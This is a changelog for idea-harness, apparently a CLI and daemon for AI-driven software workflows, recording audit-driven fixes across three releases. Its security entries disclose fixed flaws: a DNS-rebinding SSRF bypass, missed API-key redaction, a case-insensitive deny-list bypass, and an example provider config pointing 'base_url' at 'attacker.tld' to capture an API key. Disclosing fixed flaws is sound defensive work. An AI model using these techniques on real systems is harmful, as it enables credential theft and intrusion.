# Changelog

All notable changes to idea-harness are recorded here, following
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

Versioning is pre-1.0: the CLI surface, the HTTP API, and the on-disk config schema may change in
any release. Breaking changes are listed under **Changed** or **Removed** with the migration in the
entry itself. Once 1.0 ships, this project follows semantic versioning.

## [Unreleased]

Nothing yet.

## [0.2.1] - 2026-09-04

Guards and ergonomics. No P0s — 0.2.0 is safe to stay on; this exists so the published artifact
does not drift behind `main` the way 0.1.0 did for four audit rounds.

Two response shapes change, both the same class 0.2.0 listed under **Changed — BREAKING**: a client
that null-checked keeps working, one generated from `openapi.yaml` now works where it did not.

### Added

- **`idea <command> --help` works on every command.** `--help` and `-h` were rejected as unknown
  flags on all 33 subcommands, so there was no way to learn what `idea verify --waive` does or what
  kinds `idea export` takes without opening `docs/cli.md`. Rendered from the same command table
  that drives `idea help` and the docs, so the three cannot disagree. Arguments after `--` are left
  alone: `idea docs add -- --help` still adds a file named `--help`.
- Recorded wire-format goldens for the three providers, plus an assertion that the token budget a
  provider emits never exceeds the ceiling it declares. Four rounds of guards compared artifacts to
  artifacts; nothing compared the request to what a provider accepts, which is how the token-budget
  P0 survived until someone spent a real API key. The cap now also exists inside each provider, so
  no caller can emit a request the provider will reject.

### Fixed

- Unmatched paths under `/api/` answer the documented `{"error": …}` envelope. `openapi.yaml` said
  every error has that shape "and nothing else"; the web UI handler is registered for `/`, so a
  wrong verb or a typo'd path fell through to `404 page not found` as `text/plain`. Ten API paths
  answered that way, and the CLI surfaced it as `idea: 404 Not Found` — the only raw HTTP status it
  prints.
- `/doctor` and `/diff` no longer emit `null` for empty arrays. The previous sweep converted eight
  fields and missed these two, so the API had become *mixed* rather than consistent — `/diff` could
  return `"added":[{…}],"removed":null` in one response. `/doctor` was the worse case: an empty
  finding list means the graph audit found nothing wrong, so the good outcome was the one returning
  `null`.

## [0.2.0] - 2026-09-04

Five developer-experience audits and their remediation. **0.1.0 contained every P0 fixed below**,
so upgrading is strongly recommended over pinning to it.

This release is breaking in the ways listed under the BREAKING headings: several commands that
exited 0 on failure now exit non-zero, a handful of HTTP status codes and response shapes changed,
and empty arrays are `[]` rather than `null`. Pre-1.0, per the versioning note above, those land in
a minor release; each entry states the consumer impact.

A second developer-experience audit of the published 0.1.0 returned FAIL at 70/100, with both hard
gates passing. Nearly every finding was one instance of the same failure: a fix made correctly in
one place and not propagated to its siblings. So the fixes below are structural where a defect class
existed, and each new guard checks a second axis.

A third audit of the same tree returned FAIL at 74/100. Its pattern was one level out: the
remediation corrected each canonical source and left the derivative copies stale, and the security
review of its fix plan then found two exploitable defects in the credential path that no audit had
looked for. Those go first below, because a wrong security document is how somebody points this at
a repository they should not.

A fourth audit returned FAIL at 79/100. Its pattern was the correction reaching two of three
documents — and its P0 was a state-machine hole no guard could see. Three adversarial reviews of
the remediation then found a security defect neither audit had looked for, two contract bugs, and
several guards that could not reach their own findings; those are recorded below alongside the
findings they were meant to catch.

A fifth audit returned FAIL at 61/100 with the magic-path gate broken. The score fell because
this round did two things no previous one had: it ran the README's block **verbatim on the no-key
path**, and it made **real provider calls**. Every P0 it found had shipped in 0.1.0 and three date
to the initial commit — four rounds of guards had compared artifacts to artifacts, and nothing
compared the product to a provider or executed the documented sequence as written.

### Fixed — the documented first run (P0)

- **`idea new` waits for the run it starts.** It received the operation id and discarded it, so it
  returned while the workflow was still going. That made the README's own eight-command quick start
  a race: the next command saw the initiative `running`, `idea next --until-human` fell through to
  "workflow running — try `idea watch`" without doing anything, and the block went on to print
  `✓ initiative complete` over an initiative with **zero change sets and no file written**.
  Measured back-to-back with no provider keys: 0 of 5 runs passed before, 5 of 5 after. With keys
  exported it passed 5 of 5 either way — ambient keys shifted the timing enough to win the race,
  which is why four audits and a passing smoke test never saw it. `--no-wait` keeps the
  fire-and-forget shape, and a failed run is now a non-zero exit rather than a silent success.

- **Stage token budgets are capped to what the provider says it can produce.** `maxOutputForStage`
  asked 32000 tokens for the PRD stage, four lines beneath a comment asserting its values "stay
  within the providers' declared MaxOutput ceilings (16k for Anthropic/OpenAI)". Nothing compared
  the two — `Capabilities.MaxOutput` was declared per provider and read nowhere — so the README's
  own worked example (`openai/gpt-4o-mini`) failed on **every** run with a non-retryable 400. A
  provider declaring 0 has stated no ceiling and is left alone, so custom OpenAI-compatible
  endpoints are unaffected.

- **Truncation is detected instead of absorbed.** Capping alone would have traded a loud 400 for a
  silently shorter artifact: `repairJSON` closes unterminated containers and the review schema has
  no `minItems`, so an adversarial review cut from 15 findings to 1 validates clean. Each provider
  now reports its own finish reason (`length`, `max_tokens`, `MAX_TOKENS`) as an error naming the
  budget that was hit.

- **`idea retry` exists.** Four comments in the daemon named it as the recovery path for a stranded
  or failed run. It had never been a command — the route and the runtime method were there and only
  the CLI entry was missing. It defaults to the configured model and takes `--model` to retry
  against a different one.

### Fixed — configuration (P0)

- **`idea model set` no longer reverts hand edits.** It assembled its write from the daemon's
  cached config, which is read once at start, and wrote the whole file back — so anything edited
  since silently reverted, at exit 0, by a command the documentation recommends. Observed:
  `review.max_cycles` 9 → 3, `research.urls` emptied, `git_commit` true → false. The sibling
  executor handler had always re-read from disk and said why; the two sat 1800 lines apart and only
  one was right.

- **A model id with no provider is refused when nothing would resolve it.** `idea model set gpt-4o`
  was accepted by `model set`, `config validate` and `doctor`, all exit 0, and with a provider key
  exported the demo banner was suppressed — so the whole workflow ran on the built-in stub while
  the user believed gpt-4o had written their PRD. It is now an error when no default provider
  exists and a warning when one does, because `models.critic: gpt-4o` beside a qualified
  `default_model` is a legitimate form. Separately, the demo banner now asks the question the
  registry asks rather than scanning for key environment variables, so synthetic output cannot be
  reported as real.

- **`idea version` no longer reports a version that does not exist.** A build from a checkout
  claimed Go's module pseudo-version — `v0.1.1-0.20260904033502-…`, one patch above the only
  release, never tagged, and outranking the real version in a bug report — while the documented
  `dev (sha, dirty)` form was unreachable. A module version is now trusted only when there is no
  VCS data, which is the one path (`go install <module>@<version>`) that produces one meaningfully.

- Provider errors carry the response body that explains them, bounded and scrubbed for anything
  credential-shaped. `openai: status 400` was the message for every OpenAI failure, and the body it
  discarded named the cause exactly — which is why the token-budget defect above survived four
  audits.

### Fixed — the initiative claim (P0)

- **A successful `idea execute` stranded the initiative in `running` forever.** The claim added in
  the previous round released only on the error path, so `idea next` answered "workflow running"
  indefinitely and every later command answered "already running", with no way back short of
  editing the database. Every gate stayed green: `scripts/smoke.sh` and the audit journey both
  revert afterwards, and `RevertChangeSet` happens to reset the status one step after the bug
  corrupts it.
- **Apply and revert now take the claim too**, from every non-running state, so a concurrent
  `revise` can no longer supersede requirements while an apply lands. A request that arrives while
  one is running gets a `409` naming the state instead of interleaving.
- **A panic after a run had already finished no longer rewrites the record.** `failOperationAfterPanic`
  wrote `failed` unconditionally, so a panic in a deferred cleanup turned a succeeded operation into
  a failed one — and the two writes it made were gated on different conditions, so it could also
  leave the operation failed and the initiative untouched.
- **Reverting a change set from `complete` lands on `plan_approved`.** The revert releases the claim
  to the status the engine chose rather than the one captured before it, so a rolled-back initiative
  is no longer reported as finished.
- **`failure_reason` survives a claim.** Apply and revert claim from `failed` and release back to
  it; both writes cleared the reason, so an initiative could be reported as failed with no
  explanation at all.
- The nine async entry points are now enumerated from the AST, with each one's claim status checked
  against the code rather than described in prose.

### Fixed — security

- **The `sk-` credential pattern missed 27–30% of every modern key shape.** Provider key bodies are
  base64url; the pattern's body class was alphanumeric, so a `_` or `-` in the first 16 characters
  of the body broke the match and the key passed every choke point — blobs, events, context bundles
  — in the clear. Measured over random base64url bodies rather than estimated. This is the second
  correction to this pattern: the first widening fixed the prefix and left the body wrong.
- **The idea text is redacted before it reaches the model provider.** It was passed raw.

Both of these were found by an adversarial security review of the *third* audit's fix plan, not by
either audit: three audits of route sets, request-body fields and 409 declarations were green while
they stood.

- **Modern provider API keys were never redacted.** The credential catalog's `sk-` pattern required
  20 or more contiguous alphanumerics immediately after the prefix, so it matched only the legacy
  flat OpenAI key. Every current format puts a hyphen inside the first few characters —
  Anthropic's `sk-ant-api03-…`, OpenAI's `sk-proj-…` and `sk-svcacct-…` — and all three passed
  through every choke point unredacted: blobs, events, context bundles. Anthropic is a first-class
  provider here and its key is the credential forwarded into the sandboxed agent container, which
  has unrestricted network egress. Measured before the fix: three of four modern formats not
  redacted.
- **The SSRF guard could be defeated by DNS rebinding.** The research fetcher resolved the URL's
  host, checked every returned address was public, and then dialled the original `host:port` — which
  Go's dialer resolves a *second* time. A DNS server the URL's owner controls answers public on the
  first lookup and `127.0.0.1` or `169.254.169.254` on the second, reaching exactly the loopback and
  cloud-metadata endpoints the check exists to block. It now dials the address it just validated.
  URLs reach the fetcher from `harness.yaml`'s `research.urls`, so a cloned or shared project could
  carry the hostile name. The regression test asserts the address the inner dialer receives, because
  a test that counts resolver calls cannot see this bug at all.

### Fixed — security documentation

- `docs/security-model.md`'s "Execution gateway" described isolation the coding agent does not get.
  Its list — no network, `--cap-drop ALL`, non-root, a read-only `/repo` mount — belongs to
  `ContainerSandbox`, whose only non-test caller is the deterministic build/test check. The
  executors that run model-generated code build a different argv: no `--network` flag at all, the
  workspace mounted read-write at `/work`, and the provider API key inside the container. The
  section is now a table of all four selectable executor kinds against their real argv — including
  `internal`, the default, which runs in the daemon process with no container at all — and the page
  gains a **"What this does not protect against"** section for the negative space: unrestricted
  egress, the redaction-free raw store, unredacted image egress, `--user` passing the daemon's own
  UID so a root daemon yields a root container, an image pinned by tag rather than digest, and a
  control-plane deny that does not cover `.github/workflows/`.
- `slog` is no longer listed as a redaction choke point. There is no redacting log handler and
  `GET /api/v1/logs` returns `daemon.log` verbatim; `docs/security.md` says so instead.
- `docs/security.md` no longer claims `human_approved` "requires a recorded human action" or that
  `reviewed_agent_output` "requires a distinct reviewer run". `security.TrustFor` reads no records —
  it maps a selector string to a level. Three of the six levels have no caller that emits them, and
  a trust level is consumed by exactly one line of code, the untrusted-data prompt wrapper: it is
  prompt hygiene, not authorization, and the page now says that.
- The claim that change-set file contents are "redacted at write time" is inverted, and was in two
  published artifacts: `docs/api.md` and `docs/openapi.yaml`. Redaction happens at the read/display
  surface; the raw blob store is deliberately redaction-free so apply and revert round-trip
  byte-for-byte. Both now state it that way and link to the one canonical statement rather than
  restating the mechanism a third time.

### Fixed — BREAKING (HTTP API)

- `GET /projects/{p}/initiatives/{i}/risk` no longer writes. It called an append-only store method,
  so every read added a row *and* an event that the activity feed returns and the SSE stream
  carries — the UI polling its risk panel, or `idea risk --json` in a reporting script, grew the
  database without bound. Nothing ever read those rows back; the profile is recomputed per request,
  which it always could have been.
- `POST …/change-sets/{id}/revert` returns `409` with the blocking status instead of `202` when the
  change set is not `applied`. `idea revert CHG-1` on an already-reverted change set used to print
  "✓ revert started" and exit 0, with the real failure only in the daemon log. `POST …/execute` now
  likewise requires an approved plan.
- `POST …/advance` and `POST …/revise` return `409` rather than `500` for precondition failures such
  as "initiative is already running", matching the four sibling endpoints that always did.
  Preconditions now carry a type, so a handler cannot report one as a server fault.
- The ten initiative routes registered under `{initiativeId}` are registered under `{id}`, so every
  initiative-scoped route names its path parameter the same way. Path *values* are unchanged; this
  is visible only in `openapi.yaml` and to generated clients.
- Executor config: when the file is written but the reload fails, the response is a `409` naming
  that state instead of an error string containing an absolute state path.
- Setting a disposition or a note on a finding that does not exist returns `404` instead of `200`.
  The update matched no row and reported success, and the provenance event was written regardless —
  so the record showed a human dispositioning a finding that was never there. `idea review resolve`
  on a mistyped id printed a checkmark.

### Fixed — CLI

- **Unknown flags are an error on every command.** Ten commands ignored them: `idea status --jsonn`
  printed human output to stdout and exited 0, breaking any downstream `jq`, and `idea logs -n 200`
  silently showed the default 50 lines. Unknown *subcommands* are errors too — `idea daemon stauts`
  used to start a second daemon in the foreground, and `idea config valdiate` printed the model list
  and exited 0.
- `idea docs add -` reads from stdin, as README, `docs/ui.md`, the usage string and the quickstart's
  copy-paste line have always said. The shared parser had the carve-out for it; this command rolled
  its own loop and rejected `-` before reaching it.
- **BREAKING: `idea verify` exits non-zero when the gate is unmet.** It reported the *initiative's*
  status, not the gate's, so it exited 0 whatever the gate said — including on a requirement the
  user had just recorded as failing. Any script that branched on its exit code saw success
  unconditionally, and any script that relied on that will now stop. `idea next --until-human`
  still treats an unmet gate as the human judgment point it is and stops cleanly; only the
  standalone command fails.
- `idea verify` rejects a disposition with no requirement, and rejects two dispositions at once.
  `idea verify --pass --note "checked manually"` used to print "✓ verified" and record nothing, so a
  user believed they had signed off.
- `idea model add` rejects misspelled flags rather than dropping them, and refuses a provider with
  neither `--type` nor `--base-url` — which previously wrote a provider with no endpoint and
  reported success.
- `idea doctor` no longer claims "✓ config valid" and "all checks passed" in a directory with no
  project. Outside a project it reports the install and says there is none, and exits 0 — README
  puts it under "Verify:" before the quick start, so the documented post-install check runs exactly
  there.
- `idea init <dir>` initializes that directory instead of silently initializing the current one.
- `idea watch` stops on a not-found initiative rather than polling forever and exiting 0.
- `idea daemon status` exits non-zero when the daemon is not running.

### Changed — BREAKING (HTTP API)

- **Empty arrays are `[]`, not `null`.** Ten response fields marshalled `null` when their collection
  was empty — `/why`, `/impact`, `/models`, `/risk`'s `signals`, understanding's five, and the
  nested views' `acceptance_criteria`, `options` and `dissents`. A client generated from
  `openapi.yaml`, which types them as arrays, rejected those responses. A client that null-checked
  them keeps working.
- `POST …/change-sets/{id}/review` documents the verdicts it actually accepts. `openapi.yaml`
  declared `approve` and `reject`, which the engine has never taken — it takes `approved` and
  `rejected` — so a client generated from the spec could not approve or reject a change set at all.
  The CLI accepts the short forms and maps them, which is how the spec came to document the CLI's
  vocabulary instead of the API's.
- `RequirementStatus` gains `failed` and `waived` in the spec. Both have been emitted since human
  evidence landed and neither was declared, so a generated client rejected a valid response.

### Added — CLI

- `idea model set` and `idea executors setup` warn when the model id is absent from the bundled
  catalog. Setting one that resolves to nothing used to print a checkmark and fail on the first
  model call with a non-retryable `404`; nine such ids had shipped in the documentation. The
  executor path matters most, because that id is forwarded into the agent container, where the 404
  looks like an agent that produced nothing.
- `idea model set` also warns when your shell has the provider key and the daemon does not. The
  daemon reads the environment once, at start, and `idea init` starts it — so a key exported
  afterwards is invisible to it, and the documented order walked readers into exactly that.
  `PUT /providers` and `PUT /executors` return these as a `warnings` array.

### Added — drift guards

- `make api-docs-check` fails when a registered route has no row in `docs/api.md`. The document said
  "71 routes" while 81 were registered, and both existing guards stayed green: `api-check` compares
  routes to `openapi.yaml`, and the spec was correct. `make api-docs` adds a row per missing route.
- `make api-check` also compares each handler's decoded request-body fields against the operation's
  documented properties. That gap is how `idea verify --fail` and `--waive` shipped implemented,
  accepted by the daemon, and documented nowhere.
- The generated CLI table in `docs/cli.md` carries a **Flags** column rendered from each command's
  flag spec, so a flag that exists in code cannot be missing from the reference.
- `make docs-lint` fails on a documented command that is not a real command and on a `TYPE-n`
  reference that does not resolve. Both classes had shipped: prose invented verbs the CLI has never
  had, and identifiers pointed at rows that no longer existed. It covers README and every file in
  `docs/`, both fence styles, fenced blocks inside blockquotes, and inline code spans — each of
  those was a blind spot in an earlier version, and the wider scope immediately found a stale
  `idea revise` in `configuration.md`, a verb the CLI has never had. (`docs/plans/` is excluded:
  those are records of what was true at the time.)
- `make ledger-check` evaluates every defect-ledger row against the tree. Each row carries a
  predicate that is true exactly when its defect is present, so the check fails in both directions:
  a row marked open whose defect is gone, and a row marked fixed whose defect returned. It also
  cross-references each plan's "Mechanically checked:" list against `deferred.md`. The previous
  round's ledger had all 27 rows marked open while 21 were already fixed, and its plan claimed five
  items `deferred.md` recorded as not attempted.
- `make enum-check` compares every named string enum in `openapi.yaml` against the domain constants
  of the same name. Two enums had drifted; the three route-level guards were green through both,
  because they compare paths and field names and nothing compared a value vocabulary.
- `idea help` has a golden test. Its stability was asserted only in a comment.

### Added

- `LICENSE` — Apache-2.0, also shipped inside the release archive.
- CI runs the macOS job on both `darwin/arm64` and `darwin/amd64`. The four release binaries do not
  share a persistence layer: `modernc.org/sqlite` vendors a machine-translated SQLite per
  GOOS/GOARCH, so two shipped binaries had never run a test. README now states which platforms are
  built versus tested.

### Fixed — documentation

- `docs/api.md` documents all 81 routes, and describes `409` by cause rather than naming one of
  fifteen sources.
- `docs/architecture.md` no longer claims "no source mutation" (apply writes to the tree, through
  an approved, revertible journal) or that OpenAPI is "planned".
- `docs/security.md` records that `GET /api/v1/health` is exempt from the token, drops a
  "deferred to M3" list describing five features that shipped, and gains a threat-table row for the
  control-plane deny. `docs/security-model.md` is linked from README; both pages now say that
  *trust levels* (content provenance) and *executor trust tiers* (capabilities) are different
  mechanisms whose names both match the code.
- `docs/configuration.md` gives the real `executor.image` default.
- The reference documents no longer disagree with the handlers they describe. `docs/api.md` had a
  documented impact-counts call that returns `400` (the required `nodes` parameter was missing),
  retry's `model` marked optional when it is required, promote producing "a requirement, decision or
  question" when it only ever produces a Question, `/raw` called "the same body" as `/body` when
  `/body` is sanitized and `/raw` is not, a citation of `projection.BuildNextMove`, which is now
  `BuildGuidance`, `artifacts/diff` called a "structured diff" when it is a unified line
  diff, the initiative `/diff` described as diffing artifact versions when it reads the graph,
  "three cases" for `writeErr` when there are four, and a doc-upload row omitting `.gif`/`.webp`.
  `docs/openapi.yaml`'s change-set diff schema was missing the `files` key the handler has always
  written. Every one of these sat behind green `api-check` and `api-docs-check` runs: both compare
  route sets, neither reads prose.
- `docs/configuration.md` states what the three review budgets each bound, because they bound
  different things: `max_cycles` is review passes in the M1 loop (and `0` is not unlimited — the
  engine rewrites any non-positive value to 3), `max_tokens` is a ceiling on one response's output
  tokens, and only `max_cost_usd` is a cumulative spend ceiling.
- `docs/agents.md` no longer says the coding agent's provider key may come from the project `.env`.
  The executor reads the variable from the daemon's own process environment; a key that lives only
  in `.env` reaches the harness's own model calls and never reaches the container.

## [0.1.0] - 2026-09-03

First release. Everything below shipped in it: the tag was cut, held as an
unpublished draft while the API was unified, and re-cut so the first version
anyone can install is the one with a single addressing convention rather than
the two it started with.

### Changed — BREAKING (HTTP API)

Breaking relative to pre-release builds of `main`, not to any published version: this is the first
release, and the shape below is the one it ships with. That is why the tag was re-cut rather than
published as first drafted — publishing the old shape would have made this a migration users owed
instead of a change that cost nothing.

- Ten initiative-scoped reads moved from the flat `?initiative_id=` form to the nested path, so the
  API now has one addressing convention instead of two:

  ```text
  GET /projects/{projectId}/requirements?initiative_id=X   →  removed (404)
  GET /projects/{projectId}/initiatives/X/requirements     →  use this
  ```

  Affected: `requirements`, `assertions`, `artifacts`, `decisions`, `questions`, `findings`,
  `change-sets`, `suggested-answers`, `risk`, `doctor`. Resources addressed by their own id
  (`change-sets/{id}/apply`, `artifacts/{id}/raw`, …) and genuinely project-scoped routes
  (`providers`, `models`, `executors`) are unchanged.

  The initiative is now a required path segment. Omitting it used to be legal and made the daemon
  pick one for you — invisible in a single-initiative project, a silent wrong answer in any other.
  A stale `?initiative_id=` on a nested URL is ignored.

- `GET /initiatives/{id}/next-move` is now `GET /initiatives/{id}/guidance`. The response is
  unchanged. `/next` and `/next-move` read as variants of one endpoint and are not: `/next` returns
  a machine-executable command token and is change-set aware, while this one returns display copy
  and is change-set blind, so the two can legitimately disagree.

- `idea decisions` and `idea reviews` take an optional initiative argument, like `idea tasks`. In a
  project with no initiative they now say `no initiatives yet; run \`idea new\` first` instead of the
  daemon's `no initiatives in project`.

### Added

- The API reference can be hosted away from the binary. `APIDOCS=0 make build` drops it and 3.69 MiB
  (33.99 MiB → 30.30 MiB); the spec stays embedded either way, so a stripped binary still describes
  itself at `/openapi.yaml`. `make api-docs-dist` produces a static bundle, and
  `scripts/publish-api-docs.sh <cloudflare|aws|fastly> [--dry-run]` publishes it. See
  `docs/api-reference-hosting.md`.
- `make api-check` now runs in CI. It has caught three endpoints added by other work in progress and
  previously only ran when someone remembered to type it.

- `docs/openapi.yaml` — an OpenAPI 3.1 description of every operation, and `make api-check`, which
  fails when a route exists that the spec does not document or the reverse.
- A running daemon serves the spec and a rendered API reference without a token, outside `/api/`:
  `http://127.0.0.1:8787/openapi.yaml` and `/api-reference`.


- CI builds, vets, tests and smoke-tests on macOS as well as Linux. Nothing in the codebase branches
  on the operating system, so the differences that matter are filesystem semantics — case
  sensitivity, symlink resolution — which is exactly where the path guard and the change-set deny
  live. A case-sensitivity bypass in that deny reached a release before this job existed.
- `README.md` states the supported platforms: macOS and Linux are tested in CI; Windows is not
  supported, because the CLI starts its daemon in a new session and there is no Windows equivalent
  in the tree yet.

- `idea version` (and `--version`) prints the version, commit and whether the build came from a dirty
  tree; `idea doctor` prints the same stamp. The daemon's `/api/v1/version` reports it too, replacing
  a hardcoded `0.1.0` that every install returned regardless of what it was built from.
- Tagged releases build prebuilt macOS and Linux binaries in CI (goreleaser), with the web UI
  embedded and `-trimpath` so no maintainer's local paths ship inside them.

- `idea next --until-human` runs the automatable steps (`advance` → `execute` → `verify`) back to
  back, waiting for each to finish, and stops at the first human judgment point. The documented
  quick start drops from 13 commands to 8. A failed step stops the loop rather than continuing.
- `idea help --format=md` writes the command table as markdown to stdout (the human `idea help`
  still goes to stderr, unchanged). `docs/cli.md` embeds that table between generated-block markers,
  and `make docs` regenerates it. `docs/cli.md` documented 16 of the 36 commands the CLI dispatches;
  `risk`, `diff`, `cancel` and `change <id>` appeared in no document at all. `make docs-check` fails
  on drift and runs in CI, so a new command can no longer ship undocumented.

### Changed

- `idea apply` on a change set that cannot be applied now fails with what to do instead — already
  applied (`idea revert`), not yet approved (`idea review … approve`), rejected (`idea reviews`).
  Apply is asynchronous, so it previously answered `✓ apply started` and failed out of sight.

- The Go module path is now `github.com/devarispbrown/idea-harness`, matching the repository. It
  declared `github.com/idea-harness/idea-harness`, which resolves nowhere, so no tag could ever have
  made `go install <module>@<version>` work. Free to change now (no tags, no consumers); a breaking
  change the moment either exists, which is why it lands before the first tag.

- `idea model set` refuses a provider that does not exist, naming the ones that do. It previously
  answered `✓ default model set to bogus/model` and failed at the first run.
- `idea doctor` exits non-zero when a check fails. It printed the failure and exited 0, so a script
  that ran it as the post-install check could not tell.
- `idea help` now lists `verify`, `next` and `help` itself, which were dispatched but never shown.

- Unknown flags are now an error naming the command's accepted flags, instead of being silently
  treated as a positional argument (or, for `idea next`, discarded).
- `idea plan --json` now fails with a message pointing at `idea tasks --json`. It previously accepted
  the flag and printed markdown. The execution plan is a markdown artifact and has no JSON form.
- `idea prd` and `idea export` render daemon errors in the same shape as every other command; they
  previously printed the raw response body behind a `daemon: ` prefix.
- `idea verify --json` now emits the verification status and coverage as JSON. It previously accepted
  the flag and printed human-formatted output.
- `docs/configuration.md` documents the top-level `harness.yaml` fields, including `git_commit`,
  which README, the quick start and `docs/ui.md` all referenced while the configuration reference
  did not mention it at all.

- `README.md` no longer describes Node and pnpm as optional for installing. They are needed only to
  change the web UI.

### Fixed

- `idea prd`, `idea export` and `idea plan` render the artifact belonging to the initiative you are
  working on. They selected the last artifact of a matching kind from whatever initiative the daemon
  defaulted to, so in a project with more than one initiative they could silently render another
  initiative's PRD or plan. `idea export --json` also treated the flag as an artifact kind.
- Endpoints that resolve an initiative from `?initiative_id=` fall back to the most recent
  initiative when it is omitted, matching what the CLI means by "the initiative you are working on".
  They fell back to the oldest, so the daemon could answer about a different initiative than the CLI
  was asking about.
- A completed initiative no longer suggests more work: `idea status` said `● complete` and then
  `→ Resolve open questions`. Anything still open on a complete initiative is reported as being on
  the record, not as a next step.
- A pre-existing config problem no longer blocks unrelated provider writes. Any error anywhere in
  `harness.yaml` rejected every `idea model set` and UI Settings save — including the one that would
  have fixed it. Only problems attributable to what the request writes block it now.

- `idea next --until-human` stops when a step changes nothing instead of retrying it. After `apply`,
  the verification gate runs clean while the initiative waits on human evidence, so the loop ran the
  gate 50 times and then exited non-zero blaming the initiative — on the quick start's own path. It
  now names the requirements still missing evidence and the command that records it.

- Unknown ids get an error that names them. `idea apply CHG-99` answered `sql: no rows in result
  set` — the database driver's own string, with no indication of what was wrong or how to fix it.
  It now answers `no change set matching "CHG-99"`. The mapping lives at the store boundary, so
  every command and endpoint that looks something up inherits it.
- Server-side failures no longer expose internal detail. A 5xx now carries a generic message and a
  correlation id, with the full error logged under that id.

- `idea config validate` reports a configuration that cannot work. A model spec naming a provider
  that resolves to nothing — `idea model set bogus/model`, or a hand-edited `default_model`,
  `executor.model` or `models.<role>` — used to answer `config: valid`. It is now an error naming
  the field and listing the providers that are configured. A known provider whose `api_key_env` is
  unset is a warning, not an error: running without a key is demo mode. Custom OpenAI-compatible
  providers (Groq, Together, LM Studio) stay valid — any name under `harness.providers` counts as
  configured. A config with problems still loads, so upgrading never makes an existing project
  unopenable.

- `--json` works on the state-returning commands: `tasks`, `changes`, `risk`, `explain`, `why`,
  `impact`, `trace`, `diff` and `verify`. Each of them treated the flag itself as a positional
  initiative reference, so the daemon looked up an initiative named `--json`, missed, and the CLI
  printed `sql: no rows in result set` and exited 1. `idea trace --json` returns one
  `{"why": …, "impact": …}` document rather than two concatenated arrays.
- `advance`, `execute`, `watch` and `next` had the same mis-parse and now reject unknown flags
  outright; they take no flags and produce no JSON.

- A clean checkout now compiles with no Node toolchain. `internal/web/dist/` was ignored by git while
  `internal/web/web.go` embeds it, so `go install ./cmd/idea`, `make test`, and `make vet` all failed
  in a fresh clone with `pattern dist: no matching files found`. A placeholder `dist/index.html` is
  committed; `make build` overwrites it with the real UI.

### Security

- The control-plane deny is case-insensitive. `.idea-harness/**` and `.git/**` were matched exactly,
  so on a case-insensitive filesystem (macOS and Windows by default) a change set naming
  `.IDEA-HARNESS/harness.yaml` or `.Git/hooks/pre-commit` was accepted and written — into the very
  directories the deny exists to protect.

- A provider's `base_url` is validated when the provider registry is built, not only on the write
  path, so a `harness.yaml` that arrives another way — a cloned repo, a hand edit, a restored backup
  — cannot repoint a preset provider at another host and inherit its API key. A refused entry is not
  registered: a preset falls back to its built-in endpoint, a custom name becomes unresolvable, the
  project still opens, and the reason is logged and reported. The providers view now shows the
  endpoint requests actually reach rather than the refused one.

- The web UI response carries a Content-Security-Policy and `Cache-Control: no-store`. The page
  embeds the per-install API token in a meta tag and the daemon binds a fixed loopback port that
  other local dev servers also use — an origin, and a browser cache, idea-harness does not own.
  Hashed assets keep a long TTL; their URL changes when their bytes do.
- `make embed-web` installs with `--frozen-lockfile`, `web/package.json` pins the package manager,
  and pnpm's install-script allowlist is declared empty, so re-enabling install-time code execution
  is a reviewable diff rather than a local `pnpm approve-builds`.

- A change set can no longer modify the harness control plane. `.idea-harness/**` (providers and
  their `base_url`, network policy, executor kind, `build_cmd`/`test_cmd`, `git_commit`) and
  `.git/**` (hooks, which run on your next manual commit) are excluded from the snapshot that
  becomes a change set, and a patch naming one is rejected before anything is written. Containment
  allowed both, and neither tripped the secret sweep or the path guard. `.gitignore` is unaffected.
- A coding agent is no longer launched with a provider key nobody chose. An unknown provider in
  `harness.executor.model` used to fall back to the first preset API key present in the environment,
  and the agent runs in a container with network egress. An unresolvable provider now fails the run
  with a message naming the model.
- A provider `base_url` is validated before it is stored. `PUT /providers` accepted any string and
  the registry registered it over the preset default, so `{"providers":{"openai":{"base_url":
  "https://attacker.tld/v1"}}}` sent `OPENAI_API_KEY` and the full prompt context to that host — no
  inline secret, so the existing secret check saw nothing wrong. A `base_url` must now be `https`,
  or `http` on loopback (ollama and LM Studio run locally), and overriding a built-in preset's
  endpoint is rejected outright; configure a differently-named provider instead. Keyless local
  presets may still move between loopback ports. `idea config validate` applies the same checks to a
  hand-edited `harness.yaml`.
